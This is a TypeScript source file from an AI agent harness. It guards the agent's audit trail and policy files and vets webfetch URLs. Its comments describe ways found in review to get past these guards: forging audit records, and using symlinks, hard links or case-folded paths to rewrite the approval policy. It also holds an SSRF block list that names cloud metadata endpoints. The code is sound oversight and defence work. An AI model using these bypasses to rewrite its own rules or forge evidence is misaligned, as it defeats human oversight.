      // git lists the root itself, or a directory holding it, when the whole
      // root is ignored or untracked (`! out/` asked from out/deep/). git has
      // nothing to add there, so the walk answers.
      if (!p.startsWith(prefix) || p.length === prefix.length) return undefined;
      // A trailing slash is git saying "directory, not looked into".
      const rel = p.slice(prefix.length).replace(/\/$/, "");
      const abs = join(base, rel);
      if (stampSkips(rel, p.endsWith("/"))) continue;
      let st: Stats | undefined;
      try {
        // lstat, not stat: a listed symlink is stamped as the link and never
        // followed out of the tree -- the line the walk draws too.
        st = lstatSync(abs);
      } catch {
        st = undefined;
      }
      if (st === undefined) {
        // Deleted, or the old side of a rename.
        lines.push(`${rel}:-`);
      } else if (st.isDirectory()) {
        const files = walkFiles(abs, abs);
        budget -= files.length;
        if (files.length >= WALK_MAX_FILES || budget < 0) return null;
        for (const f of files) {
          let fst: Stats;
          try {
            fst = statSync(join(abs, f));
          } catch {
            continue;
          }
          lines.push(`${rel}/${f}:${fst.size}:${fst.mtimeMs}`);
        }
      } else {
        if (--budget < 0) return null;
        lines.push(`${rel}:${st.size}:${st.mtimeMs}`);
      }
    }
  }
  lines.sort();
  return createHash("sha256").update(`git\n${head}\n${lines.join("\n")}\n`).digest("hex");
}

/**
 * gnomon's own records: the audit trail and skill-trial reports.
 *
 * Found in review of the skill-trial work (2026-11): any role without a
 * `write_allow` -- `implement` in the scaffold -- could `write` a line into
 * `.gnomon-audit/`, and so could a shell redirect. The trail is the evidence a
 * governed run is judged by afterwards, and `gnomon skill accept --evidence`
 * cites a `skill_trial` record in it: an agent that can append records can
 * forge the evidence for its own skill. Hash chaining does not stop that --
 * audit.ts says so -- and the agent never needs to write here, so the
 * directories bind every role, like the surface, with no consent path.
 *
 * The same limit as write_allow on the shell: a target the command names is
 * judged; what a script file does is not. `[audit.attest]` is what makes a
 * forged trail detectable.
 */
export const RECORD_DIRS = [".gnomon-audit", ".gnomon-trials", ".gnomon-sessions"] as const;

function recordDirs(ctx: ToolContext): string[] {
  const root = resolve(ctx.root);
  const dirs = RECORD_DIRS.map((d) => join(root, d));
  // A surface that moved its trail ([audit] dir) or its session store
  // ([session] dir) moved what needs guarding.
  const cfg = ctx.config?.config as { audit?: { dir?: unknown }; session?: { dir?: unknown } } | undefined;
  for (const declared of [cfg?.audit?.dir, cfg?.session?.dir]) {
    if (typeof declared === "string" && declared.trim()) {
      const d = isAbsolute(declared) ? resolve(declared) : resolve(root, declared);
      if (!dirs.includes(d)) dirs.push(d);
    }
  }
  return dirs;
}

/**
 * A path as a case-insensitive filesystem sees it. On Windows and macOS (by
 * default) `.GNOMON-AUDIT` IS `.gnomon-audit`, and Windows also drops trailing
 * dots and spaces from a name, so `.gnomon-audit.` is the trail too. Found in
 * re-review: both reached the trail past a byte-wise comparison. Over-inclusive
 * on a case-sensitive APFS volume, which costs a refusal of a path that merely
 * looks like the trail -- the direction the surface guard errs in as well.
 */
export function recordPathKey(p: string, platform: NodeJS.Platform = process.platform): string {
  if (platform !== "win32" && platform !== "darwin") return p;
  const parts = p.split(/[\\/]/);
  return parts
    .map((c) => (platform === "win32" && c !== "." && c !== ".." ? c.replace(/[. ]+$/, "") : c).toLowerCase())
    .join("/");
}

/** Whether a resolved path is inside one of gnomon's record directories. */
export function inRecordDir(ctx: ToolContext, abs: string): boolean {
  const under = (base: string, p: string): boolean => {
    const rel = relative(recordPathKey(base), recordPathKey(p));
    return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
  };
  // Lexical OR realpath, for the reason inSurface gives: a symlink can alias
  // the directory from either side.
  return recordDirs(ctx).some(
    (d) => under(realpathOrSelf(d), realpathOfNearest(abs)) || under(d, resolve(abs))
  );
}

/**
 * Whether an existing file is a hard link to a record. A hard link is the
 * same file under a second name, so `write hl.jsonl` on one made earlier
 * writes the trail -- re-review did exactly that with `ln`. Only a file with
 * more than one link is checked, and then against the record directories'
 * files (bounded), so the common write costs one stat.
 */
export function hardLinkedToRecord(ctx: ToolContext, abs: string): boolean {
  // Past the walk's budget this answers no, as it always has: a record written
  // through an unchecked link still changes under the record guard
  // (record_guard.ts), which stops the turn.
  return hardLinkIn(recordDirs(ctx), abs) === "yes";
}

/**
 * Whether an existing file is a hard link to a file in the surface. The same
 * hole `hardLinkedToRecord` closed for the records, found open for `.gnomon/`
 * by the orthogonality suite (LN8): with `p.toml` a hard link to
 * `.gnomon/policy.toml`, `write p.toml` rewrote the approval policy with
 * TOOL_OK, under `strict`, and no drift was reported, because neither arm of
 * inSurface sees a second name for the same inode. Fails closed past the
 * budget: a surface that large is not one gnomon can vouch for anyway.
 */
export function hardLinkedToSurface(surfaceDir: string, abs: string): boolean {
  return hardLinkIn([surfaceDir], abs) !== "no";
}

/**
 * Whether `abs` is the same file (inode) as one under `dirs`. Only a file with
 * more than one link is looked for, so the common write costs one stat. The
 * walk is bounded, and reads each directory in byte order so that which files
 * the bound covers does not depend on the filesystem's enumeration order
 * (GV17): the same tree gets the same decision on every machine.
 */
function hardLinkIn(dirs: string[], abs: string, budget = 20_000): "yes" | "no" | "unknown" {
  let st: ReturnType<typeof statSync>;
  try {
    st = statSync(abs);
  } catch {
    return "no";
  }
  if (!st || !st.isFile() || st.nlink < 2) return "no";
  let left = budget;
  let ranOut = false;
  const walk = (dir: string): boolean => {
    let entries: Dirent[];
    try {
      entries = readdirSync(dir, { withFileTypes: true }).sort((a, b) =>
        a.name < b.name ? -1 : a.name > b.name ? 1 : 0
      );
    } catch {
      return false;
    }
    for (const e of entries) {
      if (--left < 0) {
        ranOut = true;
        return false;
      }
      const p = join(dir, e.name);
      if (e.isDirectory()) {
        if (walk(p)) return true;
        if (ranOut) return false;
      } else if (e.isFile()) {
        try {
          const o = statSync(p);
          if (o.ino === st.ino && o.dev === st.dev) return true;
        } catch {
          /* gone since the listing */
        }
      }
    }
    return false;
  };
  for (const d of dirs) {
    if (walk(d)) return "yes";
    if (ranOut) return "unknown";
  }
  return "no";
}

const RECORD_WHY =
  `These directories are gnomon's own record of what was done here -- the audit ` +
  `trail, skill-trial reports and session snapshots -- and no role may write or ` +
  `remove them. A record the agent could write is not evidence of anything.`;

function recordRefusal(tool: string, path: string): Precheck {
  return {
    rule: "record",
    code: TOOL_DENIED,
    content: `Refused: "${path}" is inside gnomon's own records.\n\n${RECORD_WHY}`,
    summary: `${tool} ${path} — refused (gnomon's records)`,
  };
}

export function inSurface(ctx: ToolContext, abs: string): boolean {
  // Lexical OR realpath. Either one landing inside `.gnomon/` makes it a
  // surface write, because a symlink can move the surface hash from BOTH
  // sides and neither check alone sees both.
  //
  // Realpath alone was the first fix, for the outside-in direction: comparing
  // lexical paths let a symlink inside the repo (`glink -> .gnomon`) read as
  // an ordinary file, so `write glink/roles.toml` skipped the strict/consent
  // gate while the write still landed in .gnomon/.
  //
  // But realpath ALONE reopened the same hole inside-out, and that half was
  // strictly worse because it needs no aliasing directory — just one symlink
  // inside the surface. Measured, on a fresh root with allow="strict" (the
  // default, under which the agent may not touch its surface at all):
  // with `.gnomon/roles.toml -> ../build/roles.toml`, `write .gnomon/roles.toml`
  // returned TOOL_OK "(+1 −1)", rewrote roles.toml from model = "trusted" to
  // model = "attacker", and moved the surface hash 85d60b5e66cd -> 41e464031142.
  // The realpath arm judged it outside (its real path is build/), so no gate
  // ran; collectSurface hashes with statSync, which FOLLOWS the link, so the
  // surface it is judged by moved anyway. Same result one directory up:
  // `.gnomon/vendor -> ../build` made `write .gnomon/vendor/x.toml` a TOOL_OK
  // surface write, hash 5959ca6d666d -> bf7f28ce7360.
  //
  // The sandbox catches only the subset whose link leaves the root entirely
  // (that one returns TOOL_OUT_OF_SANDBOX), so it is not a second line of
  // defence for the in-root case above — the common one, since `.gnomon/` sits
  // in the repository the agent is editing.
  //
  // This is the rule the whole design rests on: the agent must not be able to
  // rewrite the rules it is judged by. So the guard is deliberately
  // over-inclusive. A false positive costs one consent prompt on a path that
  // merely looks like the surface; a false negative costs the pillar.
  const surfaceLexical = ctx.config?.gnomonDir
    ? resolve(ctx.config.gnomonDir)
    : resolve(ctx.root, ".gnomon");
  // The surface may itself be reached through a symlinked parent (a checkout
  // on another volume, a /tmp that is really /private/tmp); realpath that side
  // so an ordinary layout does not read as an escape.
  const surfaceReal = realpathOrSelf(surfaceLexical);
  // Compared as the filesystem compares names (LN8). On macOS by default, and
  // on Windows, `.GNOMON/policy.toml` IS `.gnomon/policy.toml`, and neither arm
  // below saw it: the lexical one compares bytes, and on macOS the realpath
  // one keeps the case it was given. The record rule already folds case this
  // way (recordPathKey); the surface did not. Identity on Linux. Over-inclusive
  // on a case-sensitive APFS volume, the direction this guard errs in.
  const under = (base: string, p: string): boolean => {
    const rel = relative(recordPathKey(base), recordPathKey(p));
    return rel === "" || (!rel.startsWith("..") && !isAbsolute(rel));
  };
  // `abs` arrives already `resolve()`d by resolveInRoot, so `..` is collapsed
  // and the lexical arm cannot be walked out of and back in.
  //
  // The third arm is a second NAME for a surface file: a hard link has no
  // path that leads into .gnomon/, lexical or real, and writing it writes the
  // surface all the same (LN8).
  return (
    under(surfaceReal, realpathOfNearest(abs)) ||
    under(surfaceLexical, resolve(abs)) ||
    hardLinkedToSurface(surfaceLexical, abs)
  );
}

export function writeAllowed(
  ctx: ToolContext,
  abs: string
): { ok: true } | { ok: false; rel: string; listed: string } {
  const allowed = ctx.writeAllow?.filter((p) => p.trim().length > 0) ?? [];
  if (allowed.length === 0) return { ok: true };
  // Resolved, not lexical. resolveInRoot and inSurface both realpath here --
  // the first because "a symlink inside the repository pointing anywhere on the
  // filesystem passed this check untouched", the second because otherwise "the
  // surface pillar is bypassable by a single symlink". write_allow was the one
  // guard left out, so a symlink inside an allowed directory could point
  // anywhere and still count as allowed.
  const rel = relative(realpathOrSelf(resolve(ctx.root)), realpathOfNearest(abs))
    .split(sep)
    .join("/");
  const ok = allowed.some((pattern) => {
    try {
      // Case-insensitive where the filesystem is: `SRC/x.ts` IS `src/x.ts`
      // on Windows, and refusing it was a false refusal with no workaround.
      return globToRegExp(pattern, process.platform === "win32" ? "i" : "").test(rel);
    } catch {
      return false;
    }
  });
  return ok
    ? { ok: true }
    : { ok: false, rel, listed: allowed.map((p) => `"${p}"`).join(", ") };
}

/**
 * `todo` — the checklist a long run is steered by.
 *
 * A turn that spans thirty tool calls loses the shape of what it set out to
 * do. The model re-derives the plan from the transcript every few steps, which
 * costs tokens and drifts; and whoever is watching cannot tell how far through
 * it is. An explicit list fixes both, and it is the model's own list rather
 * than the harness's guess at one.
 *
 * The whole list is replaced on every call rather than patched item by item.
 * A patch protocol needs stable identifiers, and identifiers a model invents
 * are a source of silent mismatches — "update item 3" against a list it has
 * since reordered. Replacing is idempotent and has no such failure.
 *
 * It touches no file and reaches nothing outside the session, so it is not in
 * MUTATING and costs no approval under `on_write`.
 */
async function todoTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  if (!ctx.todos) {
    return {
      code: TOOL_FAILED,
      content: "The checklist is unavailable in this run.",
      summary: "todo — unavailable",
    };
  }

  const raw = args.todos;
  if (!Array.isArray(raw)) {
    return {
      code: TOOL_FAILED,
      content:
        "todo takes `todos`: the complete list, e.g. " +
        '[{"content":"read the config","status":"completed"}]. ' +
        "Send the whole list every time — it replaces the previous one.",
      summary: "todo — no list",
    };
  }
  if (raw.length > 100) {
    return {
      code: TOOL_FAILED,
      content: "A checklist of more than 100 items is a plan that needs splitting.",
      summary: "todo — too many items",
    };
  }

  const todos: Todo[] = [];
  for (const item of raw) {
    const o = (item ?? {}) as Record<string, unknown>;
    const content = String(o.content ?? "").trim();
    if (!content) {
      return {
        code: TOOL_FAILED,
        content: "Every checklist item needs a non-empty `content`.",
        summary: "todo — empty item",
      };
    }
    const status = String(o.status ?? "pending");
    if (status !== "pending" && status !== "in_progress" && status !== "completed") {
      return {
        code: TOOL_FAILED,
        content:
          `"${status}" is not a status. Use pending, in_progress or completed.`,
        summary: "todo — bad status",
      };
    }
    todos.push({ content: content.slice(0, 200), status });
  }

  // One thing at a time, enforced rather than suggested. A list with four
  // items in progress is a list nobody is steering by, and it is the shape a
  // model drifts into when nothing stops it.
  const running = todos.filter((t) => t.status === "in_progress");
  if (running.length > 1) {
    return {
      code: TOOL_FAILED,
      content:
        `${running.length} items are in_progress. Exactly one thing is worked ` +
        `on at a time — mark the others pending.`,
      summary: `todo — ${running.length} in progress`,
    };
  }

  const denied = await gateReadOnly("todo", `todo — ${todos.length} item(s)`, ctx);
  if (denied) return denied;

  ctx.todos.replace(todos);

  const done = todos.filter((t) => t.status === "completed").length;
  const mark = (t: Todo) =>
    t.status === "completed" ? "[x]" : t.status === "in_progress" ? "[>]" : "[ ]";
  const body = todos.map((t) => `${mark(t)} ${t.content}`).join("\n");
  const now = running[0]?.content;
  return {
    code: TOOL_OK,
    content:
      `Checklist (${done}/${todos.length} done):\n${body || "(empty)"}` +
      (now ? `\n\nWorking on: ${now}` : ""),
    summary: `todo — ${done}/${todos.length} done${now ? ` · ${now.slice(0, 40)}` : ""}`,
  };
}

/**
 * `compute` — arithmetic the model is not asked to do in its head.
 *
 * A language model asked for a number produces one whether or not it computed
 * it, and the wrong answer arrives with exactly the same confidence as the
 * right one. Giving it somewhere deterministic to send the question is worth
 * more than any instruction not to guess — so system.md points here, and this
 * evaluates the expression exactly rather than in floating point.
 *
 * Pure: no filesystem, no network, no state. That makes it read-only in the
 * sense the approval gate cares about, so it is not in MUTATING and never
 * interrupts anyone for sign-off.
 */
async function computeTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const expression = String(args.expression ?? "").trim();
  const denied = await gateReadOnly("compute", `compute ${expression}`, ctx);
  if (denied) return denied;

  try {
    const value = compute(expression);
    return {
      code: TOOL_OK,
      content: `${expression} = ${value}`,
      summary: `compute ${expression} = ${value}`,
    };
  } catch (err) {
    if (err instanceof ComputeError) {
      // 11, not a refusal. The published contract puts "ambiguous edit" here —
      // a tool that understood the request and could not carry it out — and an
      // expression that will not parse is the same shape. Refusal (2-4) is
      // reserved for something saying no: a declined approval, an allow-list,
      // a tool this role was not given. Keeping that line in one place is what
      // lets a reader treat the buckets as meaning anything.
      return {
        code: TOOL_FAILED,
        content: `Cannot evaluate "${expression}": ${err.message}`,
        summary: `compute — ${err.message}`,
      };
    }
    throw err;
  }
}

/**
 * `task` — run a sub-turn under another role, with its own context.
 *
 * The separation this makes possible is the one the harness is built around:
 * a critique that never saw the implementer's reasoning, a verifier that
 * cannot have edited what it judges. Until now that separation existed only
 * across turns a person drove by hand — you switched role and re-explained.
 * This lets one turn reach for it.
 *
 * Three things it deliberately does:
 *
 *   * The sub-turn gets the *target role's* tools, not the caller's. That is
 *     the whole point — delegating to `verifier` must not hand it `write`
 *     because the implementor had it. Capability comes from the surface.
 *   * It cannot nest. A sub-turn is offered no `task` tool, so a run cannot
 *     fan out into a tree nobody bounded. One level is enough for the
 *     separation and is a depth a reader can hold.
 *   * Only the answer comes back, not the transcript. Replaying a sub-turn's
 *     tool calls into the parent would defeat the isolation that made it worth
 *     running — and cost the context twice.
 *
 * Gated like a write. Its own tool calls are gated individually too, so the
 * extra prompt is not redundant: it is the moment capability changes hands,
 * and it names which role is about to get what.
 */
async function taskTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  if (!ctx.delegate) {
    return {
      code: TOOL_FAILED,
      content: "Sub-turns are unavailable in this run.",
      summary: "task — unavailable",
    };
  }
  if (ctx.delegate.depth > 0) {
    // Reached only if a surface offers `task` to a role a sub-turn runs as;
    // the sub-turn's tool list already withholds it.
    return {
      code: TOOL_DENIED,
      content:
        "Refused: a sub-turn cannot start another one. Do this work here, or " +
        "report back so the turn that called you can delegate again.",
      summary: "task — refused (already a sub-turn)",
    };
  }

  const role = String(args.role ?? "").trim();
  const instruction = String(args.instruction ?? "").trim();
  const known = ctx.delegate.roles();

  // Declared delegation. A sub-turn runs with the TARGET role's tools, so this
  // is the moment capability changes hands -- and without a list, a role that
  // declares no `write` could reach one that does and have files written on
  // its behalf. Checked before "is it a real role" is answered, so an
  // un-permitted target reads the same whether or not it exists: the caller
  // learns what it may reach, not what the surface happens to contain.
  if (ctx.taskAllow !== undefined && !ctx.taskAllow.includes(role)) {
    return {
      code: TOOL_DENIED,
      content:
        `Refused: this role may not delegate to "${role || "(none)"}". ` +
        (ctx.taskAllow.length > 0
          ? `It may delegate to: ${ctx.taskAllow.join(", ")}.`
          : "It may not delegate at all.") +
        " Delegation is declared in roles.toml as task_allow.",
      summary: `task — refused (${role || "no role"} not in task_allow)`,
    };
  }

  if (!role || !known.includes(role)) {
    // Byte order (GV17): `[roles.*]` are TOML tables, unordered by the spec,
    // and a profile appends the roles it adds after them. Reordering the
    // tables, or moving a role into a profile, must not change what the
    // model reads. task_allow above is an array, declared and shown as written.
    const listed = [...known].sort((a, b) => (a < b ? -1 : a > b ? 1 : 0));
    return {
      code: TOOL_FAILED,
      content:
        `"${role || "(none)"}" is not a role in this repository. ` +
        `Available: ${listed.join(", ")}.`,
      summary: `task — unknown role "${role}"`,
    };
  }
  if (!instruction) {
    return {
      code: TOOL_FAILED,
      content:
        "task needs an `instruction`. The sub-turn starts with no history, so " +
        "say everything it needs — it cannot see this conversation.",
      summary: "task — no instruction",
    };
  }

  const subTools = ctx.config ? buildToolSet(ctx.config, role) : null;
  const offers = subTools
    ? subTools.schemas.map((t) => t.function.name).filter((n) => n !== "task")
    : [];

  if (needsApproval("task", ctx.gate)) {
    const ok = await ctx.approve({
      tool: "task",
      summary: `delegate to "${role}"`,
      preview: [
        `  role:  ${role}`,
        `  tools: ${offers.join(", ") || "(none)"}`,
        ...instruction.split("\n").slice(0, 12).map((l) => `  │ ${l}`),
      ],
    });
    if (!ok) {
      return {
        code: TOOL_DENIED,
        content: `Refused: the user declined to delegate to "${role}".`,
        summary: `task ${role} — denied`,
      };
    }
  }

  const r = await ctx.delegate.run(role, instruction);
  return {
    // The sub-turn's worst outcome is this call's outcome: a delegated
    // refusal is a refusal, not a successful delegation of one.
    code: r.code,
    content:
      `Sub-turn as "${role}" (${r.model}, ${r.toolSteps} tool call(s)) reported:\n\n` +
      r.content,
    summary: `task ${role} — ${r.toolSteps} tool call(s)`,
  };
}

// ---------------------------------------------------------------------------
// Network
// ---------------------------------------------------------------------------

/**
 * Address ranges a fetched URL may never resolve to.
 *
 * A URL supplied by a model is attacker-influenced input in every deployment
 * where the model reads anything it did not write — a fetched page, a file, an
 * issue comment. Left unchecked, `webfetch` is a server-side request forgery
 * primitive pointed at whatever the machine can reach but the network cannot:
 * a metadata endpoint holding cloud credentials, an unauthenticated admin port
 * on localhost, a service on the LAN.
 *
 * The check is on the *resolved address*, not the hostname, because a name is
 * not a destination: `localtest.me` and any attacker-controlled domain can
 * publish an A record pointing at 127.0.0.1.
 */
function isBlockedAddress(ip: string): boolean {
  const v4 = ip.match(/^(\d+)\.(\d+)\.(\d+)\.(\d+)$/);
  if (v4) {
    const [a, b] = [Number(v4[1]), Number(v4[2])];
    if (a === 0) return true; // "this network"
    if (a === 10) return true; // private
    if (a === 127) return true; // loopback
    if (a === 169 && b === 254) return true; // link-local, incl. cloud metadata
    if (a === 172 && b >= 16 && b <= 31) return true; // private
    if (a === 192 && b === 168) return true; // private
    if (a === 100 && b >= 64 && b <= 127) return true; // carrier-grade NAT
    if (a >= 224) return true; // multicast and reserved
    return false;
  }
  const v6 = ip.toLowerCase().replace(/^\[|\]$/g, "");
  if (v6 === "::1" || v6 === "::") return true; // loopback, unspecified
  if (/^fe[89ab]/.test(v6)) return true; // link-local: fe80::/10 spans fe80–febf
  if (/^f[cd]/.test(v6)) return true; // unique local
  // NAT64 well-known prefix (64:ff9b::/96) embeds an IPv4 in the low 32 bits;
  // decode it so a NAT64 spelling of a blocked address is blocked too.
  const nat64 = v6.match(/^64:ff9b::(?:0:)?(.+)$/);
  if (nat64) {
    const tail = nat64[1];
    const dotted = tail.match(/^\d+\.\d+\.\d+\.\d+$/);
    if (dotted) return isBlockedAddress(tail);
    const hex = tail.match(/^([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
    if (hex) {
      const hi = parseInt(hex[1], 16), lo = parseInt(hex[2], 16);
      return isBlockedAddress(`${(hi >> 8) & 0xff}.${hi & 0xff}.${(lo >> 8) & 0xff}.${lo & 0xff}`);
    }
  }
  // IPv4-mapped and IPv4-compatible addresses are the same destination by
  // another spelling, and both the dotted tail (::ffff:127.0.0.1) and the hex
  // tail have to be decoded — `::ffff:7f00:1` is 127.0.0.1 and
  // `::ffff:a9fe:a9fe` is 169.254.169.254 (the metadata endpoint). Checking
  // only the dotted form blocked one spelling and waved the other through.
  const mappedDotted = v6.match(/^::(?:ffff:)?(\d+\.\d+\.\d+\.\d+)$/);
  if (mappedDotted) return isBlockedAddress(mappedDotted[1]);
  const mappedHex = v6.match(/^::(?:ffff:)?([0-9a-f]{1,4}):([0-9a-f]{1,4})$/);
  if (mappedHex) {
    const hi = parseInt(mappedHex[1], 16);
    const lo = parseInt(mappedHex[2], 16);
    const v4 = `${(hi >> 8) & 0xff}.${hi & 0xff}.${(lo >> 8) & 0xff}.${lo & 0xff}`;
    return isBlockedAddress(v4);
  }
  return false;
}

/** Every address a host resolves to must be allowed, not merely the first. */
async function resolvesToBlocked(hostname: string): Promise<string | null> {
  const bare = hostname.replace(/^\[|\]$/g, "");
  if (isBlockedAddress(bare)) return bare; // a literal IP needs no lookup
  let addrs: { address: string }[];
  try {
    addrs = await dnsLookup(bare, { all: true, verbatim: true });
  } catch {
    return null; // a name that will not resolve fails at fetch, with its own error
  }
  // Any address being blocked blocks the fetch: a host that answers with one
  // public and one loopback address is the classic rebinding shape.
  for (const a of addrs) {
    if (isBlockedAddress(a.address)) return a.address;
  }
  // Residual, documented rather than pretended away: this resolves the name and
  // then fetch() resolves it again independently, so a name with a TTL-0 record
  // that alternates public/loopback answers (DNS rebinding) can pass here and
  // connect to a blocked address. Fully closing it needs pinning the vetted IP
  // through a custom dispatcher, which this zero-dependency build cannot import
  // without breaking HTTPS certificate validation. webfetch is opt-in per role
  // and gated behind [sandbox] network, which bounds the exposure.
  return null;
}

/** Strip tags and collapse whitespace — the text, not the markup. */
function htmlToText(html: string): string {
  return html
    .replace(/<script\b[^>]*>[\s\S]*?<\/script>/gi, " ")
    .replace(/<style\b[^>]*>[\s\S]*?<\/style>/gi, " ")
    .replace(/<!--[\s\S]*?-->/g, " ")
    .replace(/<[^>]+>/g, " ")
    .replace(/&nbsp;/g, " ")
    .replace(/&amp;/g, "&")
    .replace(/&lt;/g, "<")
    .replace(/&gt;/g, ">")
    .replace(/&quot;/g, '"')
    .replace(/&#39;/g, "'")
    .replace(/[ \t]+/g, " ")
    .replace(/\n\s*\n\s*\n+/g, "\n\n")
    .trim();
}

/**
 * `webfetch` — retrieve a URL as text.
 *
 * Outward-facing, so it is gated like a write: the request leaves the machine,
 * and what leaves it is a URL a model chose. It is also the one tool that
 * makes `[sandbox] network` real. That key was declared and unenforced — the
 * startup banner said so — which is the same shape as `approval = "always"`
 * being a dial that turned nothing. `network = false` now refuses the fetch
 * and names the file, so the default surface has no network reach and gaining
 * it is a visible edit that moves the surface hash.
 */
/**
 * What `webfetch` refuses before it would ask or connect: the network switch,
 * the scheme, an address this machine can reach and the network cannot.
 * Async because the last of those resolves the name.
 */
export async function webfetchPrecheck(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<{ refusal: Precheck } | { url: URL }> {
  const raw = String(args.url ?? "").trim();
  if (!raw) {
    return {
      refusal: {
        code: TOOL_FAILED,
        content: "webfetch needs a `url`.",
        summary: "webfetch — no url",
      },
    };
  }

  if (ctx.network === false) {
    return {
      refusal: {
        rule: "network",
        code: TOOL_DENIED,
        content:
          `Refused: .gnomon/policy.toml sets [sandbox] network = false, so tools ` +
          `may not reach the network. Set it to true to allow webfetch — that is ` +
          `an edit to the surface, and it changes the surface hash.`,
        summary: `webfetch ${raw} — refused (network disabled)`,
      },
    };
  }

  let url: URL;
  try {
    url = new URL(raw);
  } catch {
    return {
      refusal: {
        code: TOOL_FAILED,
        content: `"${raw}" is not a valid URL.`,
        summary: "webfetch — bad url",
      },
    };
  }
  if (url.protocol !== "http:" && url.protocol !== "https:") {
    // file: would read the filesystem with none of the sandbox checks that
    // `read` applies; the rest are not fetchable in any useful sense.
    return {
      refusal: {
        rule: "url",
        code: TOOL_DENIED,
        content: `Refused: only http and https are fetchable, not "${url.protocol}".`,
        summary: `webfetch — ${url.protocol} refused`,
      },
    };
  }

  const blocked = await resolvesToBlocked(url.hostname);
  if (blocked) {
    return {
      refusal: {
        rule: "url",
        code: TOOL_DENIED,
        content:
          `Refused: ${url.hostname} resolves to ${blocked}, a private, loopback ` +
          `or link-local address. Fetching those would let a URL reach services ` +
          `this machine can see and the network cannot — including cloud ` +
          `metadata endpoints.`,
        summary: `webfetch ${url.hostname} — refused (private address)`,
      },
    };
  }
  return { url };
}

async function webfetchTool(
  args: Record<string, unknown>,
  ctx: ToolContext
): Promise<ToolOutcome> {
  const pre = await webfetchPrecheck(args, ctx);
  if ("refusal" in pre) return outcomeOf(pre.refusal);
  const url = pre.url;
  const denied = await gateReadOnly("webfetch", `webfetch ${url.href}`, ctx, [
    `  GET ${url.href}`,
  ]);
  if (denied) return denied;

  let res: Response;
  try {
    res = await fetch(url, {
      // Redirects are followed by hand so each hop is re-checked; `follow`
      // would let a public URL bounce to 169.254.169.254 unexamined.
      redirect: "manual",
      headers: { "User-Agent": "gnomon", Accept: "text/*, application/json;q=0.9, */*;q=0.1" },
      signal: AbortSignal.timeout(ctx.timeoutMs),
    });
  } catch (err) {
    return {
      code: TOOL_FAILED,
      content: `Could not fetch ${url.href}: ${err instanceof Error ? err.message : String(err)}`,
      summary: `webfetch ${url.hostname} — failed`,
    };
  }

  if (res.status >= 300 && res.status < 400) {
    const to = res.headers.get("location");
    return {
      code: TOOL_OK_EMPTY,
      content:
        `${url.href} redirects (${res.status}) to ${to ?? "an unnamed location"}. ` +
        `Redirects are not followed automatically — call webfetch again with ` +
        `that URL if it is the one you want, and it will be checked in its own right.`,
      summary: `webfetch ${url.hostname} — ${res.status} redirect`,
    };
  }

  const body = await res.text().catch(() => "");
  const type = res.headers.get("content-type") ?? "";
  const text = /html/i.test(type) ? htmlToText(body) : body;

  return {
    code: res.ok ? TOOL_OK : TOOL_OK_EMPTY,
    content: clamp(
      `${res.status} ${res.statusText} · ${type || "unknown type"}\n\n${text}`,
      ctx,
      `webfetch-${url.hostname}`
    ),
    summary: `webfetch ${url.hostname} — ${res.status}, ${text.length} chars`,
  };
}

// ---------------------------------------------------------------------------
// Search: glob and grep
// ---------------------------------------------------------------------------

/**
 * Directories never walked by `glob` or `grep`.
 *
 * Fixed, not configurable, and deliberately so: a search that returned a
 * different set of files depending on a machine's ignore rules would make the
 * same question answerable differently on two checkouts. These are the trees
 * that are build output or dependency caches in every ecosystem this harness
 * targets, and none of them is source anyone is asking about.
 */
const dnsLookup = promisify(dnsLookupCb) as (
  host: string,
  opts: { all: true; verbatim: boolean }
) => Promise<{ address: string }[]>;

const NEVER_WALKED = new Set([
  ".git",
  "node_modules",
  "target",
  "dist",
  "build",
  ".venv",
  "venv",
  "__pycache__",
  ".mypy_cache",
  ".pytest_cache",
  ".next",
  ".turbo",
  "vendor",
  ".gnomon-audit",
  ".gnomon-sessions",
  // Decision-shadow records, appended off the critical path WHILE tools run.
  // Walked, every append would move the worktree stamp under a step that
  // changed nothing, and `worktree_changed` drives the idle nudge and the step
  // fold -- so a log-only shadow would have changed the run it was observing.
  ".gnomon-shadow",
  // Build artefacts of the same family as dist/target/.next, and absent from
  // this set until 2026-09-05. The cost was not hypothetical: `pnpm run
  // coverage` writes into `coverage/` WHILE the suite runs, so the worktree
  // stamp moved under every step, `worktree_changed` came back true for
  // commands that changed nothing, and the step-folding test failed under
  // coverage while passing without it. In a real session the same thing makes
  // the anti-flailing nudge misfire on an agent that is working correctly --
  // the premise "nothing changed" is read off this walk.
  "coverage",
  ".nyc_output",
]);

/** Hard ceilings, so a search on a large tree cannot hang or flood the window. */
const WALK_MAX_FILES = 20_000;
const SEARCH_MAX_HITS = 200;

/**
 * Walk the tree under `dir`, returning repo-relative POSIX paths, sorted.
 *
 * Sorted because the model's next move is decided by what comes back: an
 * order that depended on the filesystem would make an identical repository
 * answer the same question differently on two machines.
 *
 * `max` is WALK_MAX_FILES everywhere but the worktree stamp, which first asks
 * whether a tree is small enough to walk at all (STAMP_WALK_BELOW).
 */
export function walkFiles(root: string, dir: string, max: number = WALK_MAX_FILES): string[] {
  // A file is a valid scope of exactly one file. Without this, readdirSync
  // throws ENOTDIR, the catch below swallows it, and `grep` answers
  // "No match for /x/ under path/to/file" for a file that contains x — a wrong
  // answer shaped like a valid negative, which is the worst kind this harness
  // can give. Found by grepping an offloaded output file, which is the exact
  // thing the overflow notice tells the model to do.
  try {
    if (statSync(dir).isFile()) {
      return [relative(root, dir).split(sep).join("/")];
    }
  } catch {
    // Missing or unreadable: fall through, and the walk yields nothing.
  }
  const out: string[] = [];
  const stack: string[] = [dir];
  while (stack.length > 0 && out.length < max) {
    const cur = stack.pop()!;
    let entries: Dirent[];
    try {
      // Each directory read in byte order (GV17). The final sort below made the
      // list's order canonical, but not WHICH files are in it once `max` cuts
      // the walk short: that was decided by readdir order, which differs
      // between filesystems, so a tree over the cap gave glob and grep a
      // different answer on another machine.
      entries = readdirSync(cur, { withFileTypes: true }).sort((a, b) =>
        a.name < b.name ? -1 : a.name > b.name ? 1 : 0
      );
    } catch {
      continue; // unreadable directory is not a reason to fail the search
    }
    const subdirs: string[] = [];
    for (const e of entries) {
